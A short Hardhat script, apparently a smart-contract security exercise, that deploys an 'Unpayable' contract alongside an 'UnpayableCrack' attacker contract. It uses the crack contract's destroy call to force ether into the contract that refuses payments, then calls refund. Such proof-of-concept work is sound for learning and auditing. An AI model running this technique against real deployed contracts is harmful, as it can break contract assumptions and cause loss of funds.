const hre = require("hardhat");

async function main() {
    const [owner, addr] = await hre.ethers.getSigners();

    const Unpayable = await hre.ethers.getContractFactory("Unpayable");
    const unpayable = await Unpayable.connect(owner).deploy();

    const UnpayableCrack = await hre.ethers.getContractFactory("UnpayableCrack");
    const unpayableCrack = await UnpayableCrack.deploy();
    
    await unpayable.deployed();
    await unpayableCrack.deployed();

    const count = 100;

    unpayableCrack.connect(addr).deposit({ value: count });
    unpayableCrack.connect(addr).destroy(unpayable.address);

    unpayable.connect(owner).refund(owner.address);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
